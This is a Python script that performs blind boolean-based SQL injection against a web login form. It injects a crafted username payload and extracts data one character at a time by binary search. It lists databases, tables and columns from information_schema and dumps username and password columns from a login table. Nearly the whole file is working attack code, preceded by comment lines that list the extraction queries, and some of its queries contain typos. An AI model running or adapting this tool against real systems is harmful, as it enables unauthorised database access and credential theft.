#list db "select group_concat(schema_name) from information_schema.schemata limit 1"
#list tabels "select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1"
#list columns "select group_concat(colum_name) from information_schema.column where table_name='tablename' limit 1"
#dump columns "select group_concat(user,pass) from login limit 1"

import requests
import sys
from optparse import OptionParser

def send_data(url, data):
    return session.post(format(url), data)

def condition(cond):

    payload = "admin' and %s#" % cond
    res = send_data(base_url,{"username":payload, "password": " "}) #parameter of the request
    return true in res.text

def sqli(sql):
    result = ""

    while (True):
        range_low = 0
        range_high = 128

        for i in range(0, 64):
                testchar = (range_high+range_low)/2
                res = condition("ascii(substr((%s), %d, 1))>=%d" % (sql, len(result)+1, testchar))
                if res:
                        range_low = testchar
                else:
                        range_high = testchar

        if testchar == 0:
                break;

        result += chr(testchar)

        print "Result: %s" % result

    print result
    
parser = OptionParser(usage="usage: %prog [-D/-t/-c/-d] -u http://10.10.10.10/login.php -m 'Unknown USER' ")
parser.add_option("-D","--database",action="store_true",dest="database", help="List of Databases")
parser.add_option("-t","--table",action="store_true", dest="table", help="List of Tables")
parser.add_option("-c","--column",action="store_true", dest="column", help="List of Columns")
parser.add_option("-d","--dump",action="store_true", dest="dump", help="Dump value of Columns")
parser.add_option("-u","--url",dest="url",help="URL of the Target")
parser.add_option("-m","--msg",dest="msg",help="TRUE message")

(options,args) = parser.parse_args()


base_url = options.url
session = requests.Session()
true = options.msg
if len(args) != 1:
        parser.error("Need to specified argument")

if options.database:
        payload = "select group_concat(schema_name) from information_schema.schemata limit 1"
        print sqli(payload)

if options.table:
        payload = "select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1"
        print sqli(payload)

if options.column:
        #update tablename here
        payload = "select group_concat(column_name) from information_schema.tables where table_name='tablename' limit 1"
        print sqli(payload)

if options.dump:
        #update user,pass with ur column
        payload = "select group_concat(user,pass) from login limit 1"
        print sqli(payload)
